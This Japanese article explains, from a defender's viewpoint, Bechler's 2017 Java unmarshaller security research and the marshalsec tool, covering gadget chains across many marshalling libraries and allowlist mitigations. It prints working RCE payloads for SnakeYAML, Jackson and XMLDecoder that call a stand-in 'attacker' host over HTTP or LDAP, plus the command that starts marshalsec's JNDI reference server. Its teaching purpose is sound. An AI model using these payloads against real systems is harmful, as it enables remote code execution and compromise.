## marshalsecとアンマーシャラのセキュリティ研究

Javaのデシリアライゼーション（直列化されたバイト列をオブジェクトに復元する処理）が引き起こすRCE（Remote Code Execution、遠隔コード実行）は、2015年のChris FrohoffとGabriel Lawrenceの研究以降、Java史上最大級の脆弱性の波を生んだ。しかしその後、こうした攻撃は「Java標準のシリアライゼーション（`java.io.Serializable`）だけの問題なのか？」という疑問が残った。この問いに正面から答えたのが、Moritz Bechlerによる論文 **Java Unmarshaller Security（2017年5月22日）** と、それに付随するツール **marshalsec** である。

本節では、marshalsecが何を明らかにし、どのような仕組みで多数のマーシャリングライブラリを横断的に攻撃できるのかを、防御者の視点で解説する。ここで扱う知識は「なぜ許可リスト（whitelist）による型制限が唯一の本質的な対策なのか」を理解するための土台になる。

> **本節のスコープ**: 本節は防御・設計監査を目的とした技術解説である。実在するサービスや本番環境に対する無許可の検証、破壊的な手順、ラボ攻略の具体的手順は扱わない。ペイロード例は「なぜ危険なのか」を理解するための原理説明に限る。

### marshalsecとは何か

marshalsec（`https://github.com/mbechler/marshalsec`）は、Bechlerが論文の主張を実証するために公開した**ペイロードジェネレータ集**である。ysoserial（Java標準シリアライゼーション用のガジェット生成ツール）のマーシャラ版に相当し、SnakeYAML・XStream・Jackson・Kryo・Hessian など各種ライブラリ向けに、それぞれの形式（YAML文字列、XML、JSON、バイナリなど）でRCEを引き起こすペイロードを生成する。加えて、後述するJNDI攻撃を成立させるための小さな攻撃用サーバ（LDAP/RMIのリファレンスサーバ）を同梱する。

論文の核心的な主張は次の一文に集約される。

> オブジェクトへのアンマーシャリングは常に、ある種のコード実行である。攻撃者にあなたの知らないコードを呼び出させた瞬間、それはあなたが望まない場所へ連れて行く可能性が非常に高い。

つまり「攻撃者が復元先の型（type）を自由に指定できる」時点で、そのライブラリはほぼ確実に悪用可能だ、という一般法則である。この節を通じて、なぜそう言い切れるのかを見ていく。

> 出典: mbechler/marshalsec（GitHubリポジトリ） — https://github.com/mbechler/marshalsec

### 前提となる用語とツール

- **マーシャリング / アンマーシャリング**: 論文はJava標準のシリアライゼーションと混同を避けるため、「内部表現（オブジェクトグラフ）を転送・保存可能な表現に変換する任意の仕組み」を総称してマーシャリングと呼ぶ。逆変換がアンマーシャリング。攻撃者が入力を制御しやすいのは**アンマーシャリング側**なので、本研究の主眼はそこにある。
- **オブジェクトグラフ**: 復元されるオブジェクト同士の参照関係のネットワーク。ネストしたプロパティやコレクションの要素も含む。
- **ガジェット / ガジェットチェーン**: 攻撃者が直接コードを書くのではなく、**すでにクラスパス上に存在するクラス**の副作用を数珠つなぎにして最終的にコード実行へ到達させる手法。個々の踏み台クラスをガジェット、その連鎖をガジェットチェーンと呼ぶ。
- **sink（シンク）**: 入力が最終的に実行・解釈される危険な到達点。marshalsecの文脈では `Runtime.exec()`、`URLClassLoader` によるリモートクラスロード、JNDIルックアップなどがシンクにあたる。

ガジェット探索には、Bechler自身が開発した静的バイトコード解析ツール **Serianalyzer**（`https://github.com/mbechler/serianalyzer/`）を拡張して用いている。Serianalyzerは「初期メソッドの集合」から出発し、ネイティブメソッド（Javaで実際のシステム操作を行うには必ずネイティブメソッドを経由する）への到達可能性を追跡する。初期メソッド集合を各マーシャラの挙動（後述するsetter呼び出しや`hashCode()`呼び出しなど）に合わせて調整することで、Java標準シリアライゼーション以外の仕組みにも適用できる。

### なぜ「任意型の指定」がそのまま脆弱性になるのか

アンマーシャリングでは通常、ルート（最上位）オブジェクトの期待型は分かっている。受け取ったデータで何かをしたいのだから当然だ。この期待型から**リフレクション**でプロパティの型を再帰的に決定すれば、攻撃者は勝手な型を差し込めない。

ところが多くの実装は、Javaの継承・インタフェースによる**多態性（polymorphism）**を許すために、表現の中に型情報を埋め込み、それに従ってオブジェクトを復元する。この設計が致命的だ。攻撃者に任意型の指定を許すと、その型のオブジェクトに対して**一定範囲のメソッド呼び出し**（コンストラクタ、setter、getter、`hashCode()`/`equals()`/`compareTo()` など）を発火させられる。「そのメソッドはお行儀よく振る舞うはずだ」という暗黙の期待こそが、攻撃者の付け入る隙になる。

論文が挙げた「デフォルトで任意型のアンマーシャリングを許す（または過去に許していた）」主要OSSライブラリは次の通り。

| ライブラリ | 形式 | 値の設定方式 |
|---|---|---|
| SnakeYAML | YAML | Beanプロパティ（public） |
| jYAML | YAML | Beanプロパティ |
| YamlBeans | YAML | Beanプロパティ |
| Apache Flex BlazeDS | AMF | Beanプロパティ |
| Red5 IO AMF | AMF | Beanプロパティ |
| json-io | JSON | フィールド直接 |
| Castor | XML | Beanプロパティ |
| Java XMLDecoder | XML | 任意メソッド/コンストラクタ |
| Java Serialization | バイナリ | フィールド直接 |
| Kryo | バイナリ | フィールド直接 |
| Hessian/Burlap | バイナリ/XML | フィールド直接 |
| XStream | XML/各種 | フィールド直接 |
| Jackson | JSON | Beanプロパティ（多態モード時のみ危険） |

一方、**構造的に安全な例外**として、JAXB（使用する型の事前登録が必要）、スキーマ定義やコンパイルを要する機構（XmlBeans、JiBX、Protobuf）、GSON（ルート型を要求し多態には登録が必要）、GWT-RPC（自動で許可リストを構築）が挙げられている。この対比が重要だ。**安全なライブラリはすべて「型を明示的に選別する」機構を持っている**。

### 2つの大分類: Beanプロパティ型とフィールド型

論文は、値の設定方式で全ライブラリを2群に分ける。この分類が、どのガジェットが刺さるかを決める。

#### Beanプロパティ型マーシャラ

JavaBean規約（`getXyz()`/`isXyz()`/`setXyz()`）に従ってプロパティを設定する。型のAPIを尊重するため復元できるオブジェクトグラフは限定的だが、**setterを呼ぶ＝アンマーシャリング中に多くのコードが直接発火する**という危険を抱える。SnakeYAML、jYAML、YamlBeans、BlazeDS、Red5、Castor、Jacksonがこれに属する。

##### SnakeYAML

最も攻撃面が広い例。SnakeYAMLはpublicコンストラクタとpublicプロパティのみを許す（getterは不要）が、`!!`タグにより**任意のコンストラクタを攻撃者データで呼べる**特殊機能を持つ。これが`ScriptEngineManager`経由のRCEを可能にする。

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker/"]
  ]]
]
```

**なぜこれで実行に至るか**: `ScriptEngineManager`のコンストラクタは、渡された`ClassLoader`に対して`ServiceLoader`機構で`javax.script.ScriptEngineFactory`の実装を探す。リモートのクラスパス（`http://attacker/`）に置かれた`META-INF/services/javax.script.ScriptEngineFactory`が指すクラスがインスタンス化されるため、攻撃者のクラスが標準ライブラリのみで実行される（後述4.16）。

プロパティアクセスだけでも`JdbcRowSetImpl`が使える。

```yaml
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: ldap://attacker/obj
  autoCommit: true
```

**なぜこれで実行に至るか**: `dataSourceName`にJNDIのURIを、続いて`autoCommit`を設定すると、`JdbcRowSetImpl`は`connect()`を呼び、その中で`InitialContext.lookup()`を攻撃者のJNDI URIに対して発行する。これがJNDIリファレンス攻撃（後述）のトリガになる。順序が重要で、2つのsetterが正しい順で呼ばれる必要がある。

**緩和策**: SnakeYAMLには全カスタム型を禁じる`SafeConstructor`が付属する。あるいはカスタム`Constructor`実装で許可リストを実装できる。

##### Jackson

Jacksonはデフォルトでは**厳格な実行時型チェック**（コレクションのジェネリック型も含む）を行い任意型を許さないため、標準設定では安全である。ただし多態アンマーシャリングを有効化するモードがあり、その中には**Javaクラス名を使う**ものがある。危険になるのは以下いずれかを行ったとき。

- `ObjectMapper.enableDefaultTyping()`（グローバル有効化）
- カスタム`TypeResolverBuilder`
- フィールドへの`@JsonTypeInfo`

この状態では、`readValue()`がスーパタイプを使う、あるいはネストしたフィールド/コレクションがそうした型を持つ場合に悪用が可能になる。ペイロード例。

```json
["com.sun.rowset.JdbcRowSetImpl", {
  "dataSourceName": "ldap://attacker/obj",
  "autoCommit": true
}]
```

**バージョン依存の重要な注意**: この`JdbcRowSetImpl`経路はJackson 2.7.0未満では動かない。Jacksonは同一プロパティ（`matchColumn`）に複数の競合するsetterがあるかを検査し、`JdbcRowSetImpl`はこのプロパティに3つのsetterを持つため弾かれるからだ。2.7.0でこの解決ロジックが追加されたが、そのロジックにバグがあり、`Class.getMethods()`の返す順序（ほぼランダム）次第で本来失敗すべき検査が通ってしまう。なお`JdbcRowSetImpl`が塞がれても、Jacksonは`SpringPropFac`、`SpringBFAdv`、`C3P0RefDS`、`C3P0WrapDS`、`RMIRemoteObj`で確実に悪用できる。

**緩和策**: 多態を使うなら`@JsonTypeInfo`で`JsonTypeInfo.Id.NAME`を指定し、許容するサブタイプを明示列挙する（＝名前ベースの許可リスト）。

##### Castor・Java XMLDecoder

Castorはpublicデフォルトコンストラクタを要求し、`addXYZ(Object)`や`createXYZ()`といった追加のアクセサも発火させる。プリミティブ型プロパティが常にオブジェクト型より先に設定されるという癖があり、これが`JdbcRowset`の悪用を阻む（`dataSourceName`（文字列）を`autoCommit`（プリミティブ）より先に設定できないため）。代わりに`SpringBFAdv`や`C3P0WrapDS`が使える。

`java.beans.XMLDecoder`は「完全性のために」触れられているが、任意型に対する任意メソッド・任意コンストラクタ呼び出しを許すため極めて危険である。

```xml
<new class="java.lang.ProcessBuilder">
  <string>/usr/bin/gedit</string><method name="start"/>
</new>
```

**緩和策**: XMLDecoderに関する論文の助言は明快だ。「絶対に信頼できるデータ以外には、決して、絶対に使うな」。

#### フィールド型マーシャラ

setterを介さずフィールドを直接書き換える。メソッド呼び出しという意味では攻撃面が狭い（コンストラクタすら呼ばずに復元するものもある）。しかし privateフィールドを直接触るため副作用が生じやすく、より広範なオブジェクトグラフを復元できてしまう。さらに、コレクションなどはランタイム表現のまま効率的に転送できないので、各ライブラリは特定型向けの**カスタムコンバータ**を同梱する。このコンバータが攻撃者オブジェクトに対して`hashCode()`・`equals()`・`compareTo()`（ソート済みコレクションの場合）を呼ぶことが、フィールド型のガジェット発火点になる。Kryo、Hessian/Burlap、json-io、XStream、そしてJava標準シリアライゼーション自身がこの群だ。

##### Kryo

Kryoはデフォルトではpublicデフォルトコンストラクタを要求しプロキシも非対応で、多くの既知ガジェットを封じている。しかしインスタンス化戦略が差し替え可能で、`org.objenesis.strategy.StdInstantiatorStrategy`にすると`ReflectionFactory`ベースになり、**カスタムコンストラクタを呼ばずに**（ただし`java.lang.Object`のコンストラクタは呼ぶ）オブジェクトを生成できてしまう。デフォルトコンストラクタ要件という一見些細な制約が、悪用可能なガジェット数を大きく左右する好例である。ソート済みコレクションと`Comparator`のサポートにより`BeanComparator`（BeanComp）が適用でき、代替戦略を使えば`ServiceLoader`、`BindingEnumeration`、`ImageIO`など標準ライブラリのみのガジェットも一気に開放される。

**緩和策**: Kryoは全使用型の**事前登録**を要求する設定にできる（ただしセキュリティ目的の機能ではなく、全システムで登録順序を揃える必要があるなどの副作用がある）。

##### Hessian/Burlap

Hessian/Burlapは`sun.misc.Unsafe`による副作用のないインスタンス化を使い、transientフィールドを復元せず、任意プロキシやカスタムコレクションComparatorも非対応と、防御的に見える。**しかし致命的な実装バグがある**: `java.io.Serializable`のチェックを一見行うように見えて、そのチェックは**マーシャリング時にしか適用されず、アンマーシャリング時には適用されない**。もしこのチェックがアンマーシャリング時に効いていれば、他の制約を通り抜ける悪用可能なオブジェクトグラフの大半は復元できなかったはずだ。この非対称性のため、非SerializableのSpringCompAdvやResin、SerializableなROMEやXBeanで悪用できる。

**緩和策**: バージョン4.0.51で`ClassFactory`による許可リストのオプションサポートが追加された。

##### json-io

json-ioはほぼ任意のコンストラクタを呼ぶ。2つの特徴が悪用の鍵。**Brute-Force-Construction**（デフォルトコンストラクタがないと、null/デフォルト値で他のコンストラクタを成功するまで試す）と、**Two-Stage-Reconstruction**（`hashCode()`に依存するコレクションは他オブジェクトの後に、予期しない順序で復元される）。標準ライブラリの`TemplatesImpl`もSpringの`DefaultListableBeanFactory`も復元できるため、一部ガジェットで直接バイトコード実行が可能。ルート型は指定できない。

**緩和策**: 型許可リストを実装する明確な方法がなく、メンテナは応答なし（論文執筆時点）。

##### XStream

XStreamに対する警告と攻撃は以前から多数あった（2013年のDinis Cruzらによる`java.beans.EventHandler`攻撃、2016年のArshan DabirsiaghiによるGroovy攻撃など）。XStreamはできる限り多くのオブジェクトグラフを許そうとし、デフォルトコンバータは「強化版Java Serialization」とも言える。最初の非Serializable親コンストラクタ呼び出しを除けば、**Java SerializationでできることはほぼすべてXStreamでもできる**（プロキシ構築を含む）。しかも型が`java.io.Serializable`を実装している必要すらない。marshalsecはここで、プロキシを使わない標準ライブラリのみの新しい経路（ServiceLoader、ImageIO、LazySearchEnum、BindingEnum）を提示した。

**緩和策**: XStreamは`TypePermission`による型フィルタリングを手厚くサポートし許可リストを構築できる。次のメジャーバージョンでは許可リストがデフォルトで有効になる予定（論文執筆時点の見通し）。

> 出典: Java Unmarshaller Security — Turning your data into code execution（Moritz Bechler, 2017） — https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf

### 共通のシンク: コード実行に至る2つの道

論文はライブラリ横断で使える「最終シンク」を整理している。理解の要はここだ。

#### Xalan TemplatesImpl — 攻撃者バイトコードの直接定義

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`（およびupstreamの`org.apache.xalan.xsltc.trax.TemplatesImpl`）は、特定メソッド呼び出し時に**攻撃者が供給したJavaバイトコードからクラスを定義・初期化できる**という稀有な能力を持つ。トリガは`newTransformer()`、public な`getOutputProperties()`、private な`getTransletInstance()`など。

**バージョン依存の重要点**: JDK版はJava 8u45以降、コード実行に至る前にtransientな`_tfactory`フィールドを参照する。そのため使用可能な状態で復元するには「transientフィールドを設定できる」「任意コンストラクタを呼べる」「`readObject()`を呼ぶアンマーシャラである」のいずれかが必要。upstream版にはこの制約がない。必要なフィールドのsetterはprivate/protectedなので、フィールド型マーシャラか、非publicなsetterを呼べるBean型マーシャラでしか使えない。

#### JNDIリファレンスによるコード実行 — 本研究の中心的シンク

marshalsecの多くのガジェットは、最終的に**JNDIルックアップ**へ帰着する。仕組みを段階的に説明する。

JNDI（Java Naming and Directory Interface）はディレクトリ経由でオブジェクトにアクセスする。RMIとLDAPは、ネイティブJavaオブジェクトをディレクトリ経由で取得でき、それらはJava Serializationで転送される。両者ともオブジェクトが**自分のクラスをどのコードベース（URL）から読むか**を指定できる。この危険な機能はさすがに長らくデフォルト無効だ。

しかしJNDIには**リファレンス機構**がある。JNDIに格納されたオブジェクトが「私は別の場所から読み込むべきだ」と示せる仕組みで、`javax.naming.spi.ObjectFactory`（オブジェクトを生成/取得するファクトリ）を指定できる。そしてこのファクトリクラスを読み込むコードベースには**何の制限もない**。攻撃の流れはこうだ。

1. アプリが攻撃者の制御する`name`引数で`InitialContext.lookup()`を呼ぶ。
2. これが攻撃者のサーバへの接続を発生させる。
3. サーバはリファレンスを返す。そこにはオブジェクトファクトリ名と、攻撃者の制御するコードベースURLが含まれる。
4. デフォルトのJNDI実装は、そのコードベースで`URLClassLoader`を構築し、指定されたファクトリクラスを読み込み・初期化する（該当コードは`javax.naming.spi.NamingManager.getObjectInstance()`）。
5. 攻撃者のコードが実行される。

**修正状況（時事性）**: Java 8u121でようやくこのコードベース制限が追加された。**ただしRMIに対してのみ**であり、LDAPは論文執筆時点で未対応だった（後にJava 8u191/11.0.1でLDAPにも制限が入る）。重要なのは、RMIの制限がかかっても`ContinuationContext`を復元できれば**ネットワークの迂回すら省ける**点、そしてコードベース制限を回避されてもJava Serialization自体へエスカレーションできてしまう点だ。marshalsecはこの攻撃を成立させるため、`marshalsec.jndi.LDAPRefServer`と`marshalsec.jndi.RMIRefServer`という2つのリファレンスサーバを同梱している（下記は研究環境での仕組み確認用の起動形式）。

```text
java -cp target/marshalsec-<VERSION>-SNAPSHOT-all.jar \
  marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]
```

> 出典: mbechler/marshalsec（GitHubリポジトリ、JNDIサーバ含む） — https://github.com/mbechler/marshalsec

### 代表的ガジェットチェーンの仕組み

同じJNDIシンクへ、様々な「発火の引き金」から到達できる点がガジェットチェーンの本質だ。いくつか原理を示す。

#### JdbcRowSetImpl（4.2）

標準ライブラリ。`Serializable`実装・デフォルトコンストラクタ・getterあり。前述の通り`dataSourceName`→`autoCommit`の2つのsetterで`connect()`→`InitialContext.lookup()`に至る。setter駆動のBean型マーシャラ（SnakeYAML、jYAML、Red5、Jackson）に刺さる、最も直接的なガジェット。

#### ServiceLoader$LazyIterator（4.3）

標準ライブラリ。`Serializable`でなくデフォルトコンストラクタもsetterもない。`URLClassLoader`を復元でき、内部クラスのインスタンスを扱えるフィールド型マーシャラ（Kryo代替戦略、XStream）向け。仕組みは、`LazyIterator`を`URLClassLoader`とともに作り、`Iterator.next()`を呼ぶと**リモートのサービス定義を読み込み、リモートコードベースの指定クラスをインスタンス化**する。`next()`を発火させる引き金として、`ServiceLoader`で`Iterable`に変換して反復させる、あるいはコレクション反復を返すモックプロキシ（Java 8u71以前は標準の`AnnotationInvocationHandler`で構築可能）を使う。さらに論文は、プロキシを一切使わない標準ライブラリのみの連鎖（`NativeString.hashCode()`→`Base64Data.toString()`→`CipherInputStream`経由で`Cipher.update()`→任意`Iterator`の参照）も示している。

#### BindingEnumeration（4.4）/ LazySearchEnumerationImpl（4.5）

いずれも標準ライブラリで、4.3のiteratorトリガを使い、`Enumeration.next()`経由でJNDI/RMIルックアップ（4.4）や、`ContinuationDirContext`経由でリモートコードベースのクラス初期化（4.5）に至る。4.4はJNDI/RMIに限られるため**u121以降は直接のコード実行には使えなくなった**（コードベース制限のため）。

#### C3P0 WrapperConnectionPoolDataSource（4.9）

c3p0が必要。`Serializable`・デフォルトコンストラクタ・getterあり。**1つのsetterで実行に至る**強力なガジェット。`userOverridesAsString`プロパティを設定するとコンストラクタで登録された`PropertyChangeEvent`リスナが発火し、値の一部を（先頭22文字と末尾を除いて）16進デコードしてJavaデシリアライズする。復元されたオブジェクトが`IndirectlySerialized`を実装していれば`getObject()`が呼ばれ、`ReferenceIndirector$ReferenceSerialized`がリモートクラスパスからJNDI ObjectFactoryとしてクラスをインスタンス化する。Bean型・フィールド型の広範なマーシャラに適用できる汎用性が特徴。

#### BeanComparator（4.17）/ ROME EqualsBean・ToStringBean（4.18）

いずれもFrohoffが公開した既知のJavaシリアライゼーションガジェットで、marshalsecはこれをKryoやXStreamにも転用する。BeanComparatorは、カスタム`Comparator`を持つソート済みコレクションに対象オブジェクトを2つ挿入すると、`property`で指定したgetterが両者に対して呼ばれる仕組み。`databaseMetaData`プロパティ経由で`TemplatesImpl`や`JdbcRowset`を発火できる。ROMEは`EqualsBean.hashCode()`→`ToStringBean.toString()`→`beanClass`の全getter呼び出し、という連鎖で同じシンクに到達する。**同一のガジェットが複数のマーシャラで再利用できる**ことこそ、この問題がライブラリ横断的である証左だ。

#### ScriptEngineManager（4.16）

標準ライブラリのみ。任意コンストラクタを攻撃者データで呼べる能力（SnakeYAMLが該当）が前提。`URL`→`URLClassLoader`→`ScriptEngineManager`とネストして構築すると、コンストラクタが`ScriptEngineFactory`の`ServiceLoader`機構を起動し、リモートクラスパスの任意クラスをインスタンス化する。外部依存を一切必要としないため、SnakeYAMLに対する定番の実証手段となった。

### アンマーシャリング後にも危険は続く: 「再」シリアライゼーション

論文の第5章は、アンマーシャリング完了後の危険を扱う。復元されたオブジェクトグラフが型チェックを通過しても、その後の処理で悪用が起こりうる。

- **マーシャリング時のgetter呼び出し（5.1）**: Bean型マーシャラは、グラフ内の全オブジェクトの全getterを呼ぶ。よって、あるアンマーシャラで復元したオブジェクトを別の仕組みで**マーシャリング**すると、新たなメソッド群が発火する。例: `TemplatesImpl.getOutputProperties()`でバイトコード実行、`JdbcRowSetImpl.getDatabaseMetaData()`でJNDIルックアップ、`SignedObject.getObject()`で供給データのJavaデシリアライズ。
- **Java「再」シリアライゼーション（5.2）**: 多くのサーブレットコンテナは、セッションをページアウトする際にオブジェクトグラフをシリアライズし、ページインで復元する。この passivation が、初期化コード（`afterPropertiesSet()`や`readObject()`）を後から発火させ、本来到達しない攻撃経路を開くことがある。spring-txの`JtaTransactionManager`がその例。

これらは「復元さえ通れば安全」という思い込みを崩す。**アンマーシャリングを通した後もオブジェクトは信頼できない**。

### 結論と防御 — なぜ許可リストだけが本質的対策なのか

論文の結論は、防御設計に直結する重要な洞察を含む。

1. **これらの仕組みはそもそも公開APIに向かない**。Javaの型情報を運ぶことで実装詳細を露出するからだ。しかしそれでも、ほぼ全ライブラリで主要プロジェクトへの悪用可能な用例が見つかり、多くが致命的な脆弱性となった。
2. **Javaだけの問題ではない**。C#のJson.NETの`TypeNameHandling`も同種の攻撃対象になりうる。Javaはフラットなクラスパス構造と巨大な標準ライブラリ、そして「一見無害なAPIでRCEに至るエンタープライズ機能（JNDI）」を抱えるため、攻撃面が特に広い。
3. **フィールド型とBean型でガジェットの重複は少ないが、危険度は同等**。決め手は「悪用に使える型がどれだけクラスパス上にあるか」であり、可視性・コンストラクタ要件・実行時型情報がそれを制約する。
4. **`java.io.Serializable`による「意図の宣言」は失敗した**。理由は複数ある。同一インタフェースが passivation（透過的復元を望む）とデータ転送（副作用最小化を望む）という相反する目的を兼ねること、インタフェース継承ゆえに全サブタイプに宣言が強制されること、そして「安全かどうか」の判断を全体像を見ていない者に押し付けること。あるコードベースで安全に見えるものが、別のコードベースでの複雑な相互作用によって突然悪用可能になる。
5. **commons-collectionsやgroovyが個々のガジェットを「修正」したのは誤り**だった。根本問題（型が無制限に復元されること）を残したまま、多数の悪用可能インスタンスを放置したからだ。しかも本論文が扱う多くの仕組みでは、そもそも「型が自分自身のアンマーシャリングを拒否する」手段が存在しないため、この種の緩和は実装すらできない。

したがって唯一の適切な修正は、**復元可能な型を既知の良性なものだけに制限すること**である。手段は次のいずれか、または組み合わせ。

- **明示的な許可リスト（whitelist）**: 復元してよい型を列挙する。
- **ルート型からの実行時型情報による制限**: 期待型が判明するまでアンマーシャリングを遅延させ、フィールド/プロパティ/コレクションの型を根から完全にチェックする。多態を完全には扱えないが、有効な緩和。
- **多態型の登録**: GSONやJacksonの`Id.NAME`多態のように、許容するサブタイプを名前で登録する。安全性と利便性の良いバランス。

そして許可された型は、アンマーシャリング時に副作用を持たない「契約」を満たす必要がある。理想は**ロジックを一切含まないデータオブジェクト**だ。実務上は「実際に使う型だけに制限する」で十分なことが多い。論文の最後の警句が、この分野の設計原則を要約している。

> あなたを陥れるのは、たいてい、あなたが気にも留めていない大量のコードなのだ。

防御者への実践的な含意は明確だ。マーシャリングライブラリを選ぶ・使うときは、(1) デフォルトで任意型を許すか、(2) 型の許可リスト機構を持つか、(3) その機構をデフォルト有効にしているか、を必ず確認する。SnakeYAMLなら`SafeConstructor`、XStreamなら`TypePermission`、Jacksonなら`enableDefaultTyping()`を使わず`@JsonTypeInfo(Id.NAME)`＋サブタイプ明示、というように、**各ライブラリが用意した型制限を明示的に有効化する**ことが、marshalsecが示した攻撃面を塞ぐ第一歩である。

> 出典: Java Unmarshaller Security — Turning your data into code execution（Moritz Bechler, 2017, marshalsec.pdf） — https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf
